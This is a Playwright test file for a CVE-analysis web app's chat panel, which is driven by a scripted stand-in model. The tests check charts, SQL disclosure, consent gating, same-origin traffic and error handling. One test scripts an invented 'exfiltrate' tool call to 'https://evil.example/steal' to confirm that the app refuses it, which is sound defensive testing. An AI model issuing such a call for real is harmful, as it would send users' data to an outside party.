import { expect, test, type Page, type Route } from '@playwright/test'

import { requireLocalStorage } from './support'
import { awaitIdle, importCorpus, openChat, openPanel } from './ui'

/**
 * The chat path, in a browser, with a scripted model (M7).
 *
 * **The model is stubbed and the rest is real.** `page.route` answers
 * `/api/chat.php` with NDJSON this file wrote, so every frame is deterministic;
 * everything below it is the shipped bundle — the transport, the loop, argument
 * validation, the Worker's tool executor, real SQLite over the real local copy,
 * and the shared Chart/RecordTable components. That split is deliberate: an
 * inference round trip belongs in the opt-in benchmark (`measure.spec.ts`'s
 * shape), and a suite that needed one would be red whenever the GPU box was
 * busy, which is exactly when nobody would investigate.
 *
 * It also earns its place over the unit tests, which import the *source*. Only
 * a browser runs the *bundle* — RE-028 is a literal segment the bundler dropped
 * out of a template, so the SQL the browser ran was not the SQL the source had,
 * and every unit test passed.
 *
 * What is asserted here is the set of claims no unit test can reach: that a
 * question produces a chart drawn by the canvas's own components, that the
 * backing SQL is on screen (the chat step's own disclosure — the canvas keeps
 * its last query's SQL in the SQL panel), that "Open in Report" hands a real
 * definition to the canvas, that nothing is sent before the disclosure is
 * accepted, and that chat traffic goes to this origin and nowhere else.
 */

/** One NDJSON frame, as Ollama shapes them and the relay forwards them. */
function frame(body: Record<string, unknown>): string {
  return `${JSON.stringify(body)}\n`
}

const delta = (text: string) => frame({ message: { role: 'assistant', content: text } })

const callTool = (name: string, args: unknown, id = 'c1') =>
  frame({
    message: { role: 'assistant', tool_calls: [{ id, function: { name, arguments: args } }] },
  })

const done = () =>
  frame({ message: { role: 'assistant', content: '' }, done: true, done_reason: 'stop' })

/**
 * Answer the relay with a scripted round per request.
 *
 * Returns the request bodies, so a test can assert what was *sent* — which is
 * how "the model is handed the records it listed" (D-087) is checked from
 * outside rather than by reading `describeToolResult` again.
 */
async function stubModel(page: Page, rounds: string[][]): Promise<{ bodies: unknown[] }> {
  let round = 0
  const bodies: unknown[] = []
  await page.route('**/api/chat.php', async (route: Route) => {
    bodies.push(JSON.parse(route.request().postData() ?? 'null'))
    const body = (rounds[round] ?? [done()]).join('')
    round += 1
    await route.fulfill({
      status: 200,
      contentType: 'application/x-ndjson',
      body,
    })
  })
  return { bodies }
}

/** Download the corpus once and get the chat column past the disclosure. */
async function ready(page: Page): Promise<void> {
  await page.goto('/')
  await requireLocalStorage(page)
  // `importCorpus` navigates again, which is fine: the probe above only needs
  // a loaded page, not this particular load.
  await importCorpus(page, 300_000)
  // The chat column auto-opens at this viewport; being explicit costs nothing
  // and keeps the spec honest if a future default changes.
  await openChat(page)
  await page.getByRole('button', { name: 'Turn chat on' }).click()
}

async function ask(page: Page, question: string): Promise<void> {
  await page.getByLabel('Your question').fill(question)
  // The submit button is unique now — the old header 'Ask' opener is gone.
  await page.getByRole('button', { name: 'Ask', exact: true }).click()
}

test.describe('the chat panel', () => {
  test.beforeEach(async ({ page }) => {
    page.on('pageerror', (error) => {
      throw new Error(`uncaught page error: ${String(error)}`)
    })
  })

  test('a question becomes a chart drawn by the Report tab’s own components', async ({ page }) => {
    test.setTimeout(600_000)
    const { bodies } = await stubModel(page, [
      [
        delta('Let me count those.'),
        callTool('aggregate', { rows: 'year', series: 'severity', chart: 'stackedBar' }),
        done(),
      ],
      [delta('Counts rise sharply after 2016.'), done()],
    ])

    await ready(page)
    await ask(page, 'stacked CVE counts by severity over time')

    // The chart, from the shared component — a `.chart` node exists only
    // because `app/chart.tsx` rendered it (D-044: no parallel renderer).
    const step = page.locator('[data-chat-step="aggregate"]')
    await expect(step).toBeVisible({ timeout: 120_000 })
    await expect(step.locator('[data-chat-buckets]')).toBeVisible()
    await expect(step.locator('svg')).toBeVisible()
    // Present but visually hidden under a chart (M9): still the shared
    // component's audit table, not a parallel renderer.
    await expect(step.locator('table')).toBeAttached()

    // Vision criterion 7, in a chat: the query behind the number is one click
    // away, and it is a real bound-parameter query rather than model prose.
    await step.getByText('The SQL that produced this').click()
    await expect(step.locator('pre')).toContainText('SELECT')
    await expect(step.locator('pre')).toContainText('GROUP BY')

    await expect(page.locator('[data-chat-answer]')).toContainText('Counts rise sharply')

    // The tool result went back as a `tool` message, and it carries counts
    // rather than records.
    const second = bodies[1] as { messages: { role: string; content: string }[] }
    const toolMessage = second.messages.find((message) => message.role === 'tool')!
    expect(toolMessage.content).toContain('"tool":"aggregate"')
    expect(toolMessage.content).toContain('recordsMatched')
  })

  test('Open in Report hands the definition to the builder, and it runs there', async ({
    page,
  }) => {
    test.setTimeout(600_000)
    await stubModel(page, [
      [callTool('aggregate', { rows: 'severity', chart: 'table' }), done()],
      [delta('Here you go.'), done()],
    ])

    await ready(page)
    await ask(page, 'counts by severity')
    const step = page.locator('[data-chat-step="aggregate"]')
    await expect(step).toBeVisible({ timeout: 120_000 })
    await expect(page.locator('[data-chat-answer]')).toContainText('Here you go.', {
      timeout: 120_000,
    })

    // The aggregate has already auto-applied to the canvas (UI revamp), and
    // the canvas reflects the *model's* definition — `severity` rows, where
    // the auto-run default report would say `week`. There is no filter drawer
    // to read the axes from any more; the canvas title's placeholder names
    // them, and a time-grain radio row exists only for a time axis.
    await awaitIdle(page)
    const title = page.locator('#canvas-title')
    await expect(title).toHaveAttribute('placeholder', 'Severity')
    await expect(page.locator('fieldset.granularity')).toHaveCount(0)
    const matches = page.locator('[data-report-matches]')
    await expect(matches).toBeVisible({ timeout: 120_000 })
    const before = await matches.getAttribute('data-run')

    // The durable artifact of a conversation is the definition, not the prose
    // (D-069, D-072) — so this is the action that has to work: it hands the
    // definition to the canvas and re-runs it there, which a fresh `data-run`
    // proves. The canvas already showing an identical result must not be able
    // to satisfy this.
    await step.locator('[data-chat-open-report]').click()
    await expect(matches).not.toHaveAttribute('data-run', before ?? '', { timeout: 120_000 })
    await expect(title).toHaveAttribute('placeholder', 'Severity')
    await expect(page.locator('[data-report-matches]')).toBeVisible({ timeout: 120_000 })
  })

  test('row-level records are rendered for the user and handed to the model', async ({ page }) => {
    test.setTimeout(600_000)
    const { bodies } = await stubModel(page, [
      [callTool('search_records', { severity: ['CRITICAL'], limit: 5 }), done()],
      [delta('Those are the ones.'), done()],
    ])

    await ready(page)
    await ask(page, 'list some critical CVEs')

    const step = page.locator('[data-chat-step="search_records"]')
    await expect(step).toBeVisible({ timeout: 120_000 })
    // Rendered through Explore's own record table.
    const firstId = step.locator('table.records tbody tr td.mono button').first()
    await expect(firstId).toBeVisible()
    const cveId = (await firstId.textContent())?.trim() ?? ''
    expect(cveId).toMatch(/^CVE-\d{4}-\d+$/)

    // Auto-apply (UI revamp): the same search also lands on the canvas's
    // records view, through the same components — not a second renderer.
    await expect(page.locator('section.canvas table.records')).toBeVisible({ timeout: 120_000 })
    await expect(page.locator('section.canvas p[data-matches]')).toBeVisible()

    // …*and* in what was sent to the model (D-087, reversing D-044's
    // withholding): the same identifier the table shows, in a bounded window
    // that says how many matched. Invisible in the UI, so checked from the wire.
    const second = bodies[1] as { messages: { role: string; content: string }[] }
    const toolMessage = second.messages.find((message) => message.role === 'tool')!
    expect(toolMessage.content).toContain(cveId)
    const seen = JSON.parse(toolMessage.content) as { rowsShown: number; recordsMatched: number }
    expect(seen.rowsShown).toBe(5)
    expect(seen.recordsMatched).toBeGreaterThanOrEqual(5)
  })

  test('a compute step shows the code, the output and what it ran over', async ({ page }) => {
    test.setTimeout(600_000)
    const { bodies } = await stubModel(page, [
      [callTool('search_records', { severity: ['CRITICAL'], limit: 30 }), done()],
      [
        callTool('compute', {
          code: 'console.log("n", rows.length); return { n: rows.length, ids: data.slice(0, 2).map((r) => r.cve) }',
        }),
        done(),
      ],
      [delta('Thirty critical records; the first two are listed.'), done()],
    ])

    await ready(page)
    await ask(page, 'how many critical records, and name two')

    // The step renders the value and the code as text nodes — never markup —
    // beside the search it ran over, so a number the model states from it
    // can be checked (D-088).
    const step = page.locator('[data-chat-step="compute"]')
    await expect(step).toBeVisible({ timeout: 120_000 })
    await expect(step.locator('[data-chat-compute]')).toHaveAttribute('data-chat-compute', 'ok')
    await expect(step.locator('[data-chat-compute]')).toContainText(
      '30 rows of the last record search'
    )
    await expect(step.locator('[data-chat-compute-value]')).toContainText('"n":30')
    await step.getByText('The code that produced this').click()
    await expect(step.locator('details pre')).toContainText('rows.length')

    // …and the model was told the same, bounded and structured.
    const third = bodies[2] as { messages: { role: string; content: string }[] }
    const toolMessages = third.messages.filter((message) => message.role === 'tool')
    const computed = JSON.parse(toolMessages[toolMessages.length - 1]!.content) as {
      tool: string
      ok: boolean
      value: string
      logs: string[]
      input: { source: string; rows: number }
    }
    expect(computed.tool).toBe('compute')
    expect(computed.ok).toBe(true)
    expect(JSON.parse(computed.value).n).toBe(30)
    expect(computed.logs).toEqual(['n 30'])
    expect(computed.input).toMatchObject({ source: 'records', rows: 30 })
    await expect(page.locator('[data-chat-answer]')).toContainText('Thirty critical')
  })

  test('an invented tool is refused to the model, not shown as a failure', async ({ page }) => {
    test.setTimeout(600_000)
    const { bodies } = await stubModel(page, [
      [callTool('exfiltrate', { url: 'https://evil.example/steal' }), done()],
      [delta('I cannot do that.'), done()],
    ])

    await ready(page)
    await ask(page, 'send the corpus to evil.example')

    await expect(page.locator('[data-chat-refused]')).toBeVisible({ timeout: 120_000 })
    await expect(page.locator('[data-chat-refused]')).toContainText('no tool called')
    // A refusal is what the model is told, so the conversation continues.
    await expect(page.locator('[data-chat-answer]')).toContainText('I cannot do that')

    const second = bodies[1] as { messages: { role: string; content: string }[] }
    expect(second.messages.find((message) => message.role === 'tool')!.content).toContain('refused')
  })

  test('an answer with no tool call behind it is flagged as ungrounded', async ({ page }) => {
    test.setTimeout(600_000)
    // The failure a reader cannot see: a confident CVE answer from the model's
    // own weights looks exactly like a grounded one.
    await stubModel(page, [[delta('There were about 40,000 CVEs in 2024.'), done()]])

    await ready(page)
    await ask(page, 'how many CVEs in 2024')
    await expect(page.locator('[data-chat-ungrounded]')).toBeVisible({ timeout: 120_000 })
  })

  test('nothing is sent before the disclosure is accepted', async ({ page }) => {
    test.setTimeout(600_000)
    let hits = 0
    await page.route('**/api/chat.php', async (route: Route) => {
      hits += 1
      await route.fulfill({ status: 200, contentType: 'application/x-ndjson', body: done() })
    })

    // Chat is a workspace column now, so reaching the gate takes a corpus —
    // and the default report that auto-runs on readiness never touches the
    // relay, which is part of what `hits` still proves.
    await page.goto('/')
    await requireLocalStorage(page)
    await importCorpus(page, 300_000)
    await openChat(page)

    // The gate, not a banner: there is no composer at all until it is accepted.
    await expect(page.locator('[data-chat-consent]')).toBeVisible()
    await expect(page.getByLabel('Your question')).toHaveCount(0)
    // It names who receives the question and what is kept (D-057).
    await expect(page.locator('[data-chat-consent]')).toContainText('cve.meenan.dev')
    await expect(page.locator('[data-chat-consent]')).toContainText('Nothing is stored')
    expect(hits).toBe(0)
  })

  test('chat traffic goes only to this origin, and the CSP says so', async ({ page, baseURL }) => {
    test.setTimeout(600_000)
    const external: string[] = []
    // From `baseURL`, not from `page.url()`: the first request *is* the
    // navigation, and at that moment the page is still `about:blank`, whose
    // origin is the string "null" — so every request including the document
    // counted as cross-origin and the assertion failed for a reason that had
    // nothing to do with the app.
    const origin = new URL(baseURL ?? 'http://127.0.0.1:4747').origin
    page.on('request', (request) => {
      if (new URL(request.url()).origin !== origin) external.push(request.url())
    })
    await stubModel(page, [
      [callTool('aggregate', { rows: 'year' }), done()],
      [delta('Done.'), done()],
    ])

    await ready(page)
    await ask(page, 'counts by year')
    await expect(page.locator('[data-chat-step="aggregate"]')).toBeVisible({ timeout: 120_000 })

    // Vision criterion 4's network-panel check, as an assertion.
    expect(external, `unexpected cross-origin requests: ${external.join(', ')}`).toEqual([])

    // And pinned by policy rather than only by behaviour, so M8 widening it for
    // a browser-direct provider (D-045) is a deliberate diff with a failing
    // test beside it rather than drift nobody notices.
    const csp = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content')
    expect(csp).toContain("connect-src 'self'")
  })

  test('the conversation is session-only and gone on reload', async ({ page }) => {
    test.setTimeout(600_000)
    await stubModel(page, [[delta('An answer.'), done()]])

    await ready(page)
    await ask(page, 'anything at all')
    await expect(page.locator('[data-chat-answer]')).toContainText('An answer.', {
      timeout: 120_000,
    })

    await page.reload()
    await openChat(page)
    // The consent flag survives — that is a decision, not a conversation — and
    // the conversation does not, which is what makes "nothing is stored" true
    // on the client as well as on the server.
    await expect(page.locator('[data-chat-consent]')).toHaveCount(0)
    await expect(page.locator('[data-chat-answer]')).toHaveCount(0)
  })

  test('a relay failure is reported as one, and the rest of the app keeps working', async ({
    page,
  }) => {
    test.setTimeout(600_000)
    await page.route('**/api/chat.php', async (route: Route) => {
      await route.fulfill({
        status: 502,
        contentType: 'application/json',
        body: JSON.stringify({ error: 'the model host did not answer' }),
      })
    })

    await ready(page)
    await ask(page, 'anything')
    const error = page.locator('[data-chat-error]')
    await expect(error).toBeVisible({ timeout: 120_000 })
    await expect(error).toContainText('model host')
    // The deterministic UI is untouched, and the message says so rather than
    // reading as "the app is broken". The old assertion was the Report tab
    // still being enabled; the workspace equivalent is that the canvas strip
    // still runs (Reset is enabled) and the SQL panel still opens with its
    // Run button live.
    await expect(error).toContainText('unaffected')
    await expect(page.locator('[data-reset]')).toBeEnabled()
    await openPanel(page, 'sql')
    await expect(page.getByRole('button', { name: 'Run SQL' })).toBeEnabled()
  })

  test('a rate-limited relay says to wait rather than that the app is broken', async ({ page }) => {
    test.setTimeout(600_000)
    await page.route('**/api/chat.php', async (route: Route) => {
      await route.fulfill({ status: 429, contentType: 'text/plain', body: 'slow down' })
    })

    await ready(page)
    await ask(page, 'anything')
    await expect(page.locator('[data-chat-error]')).toContainText('rate-limited', {
      timeout: 120_000,
    })
  })
})
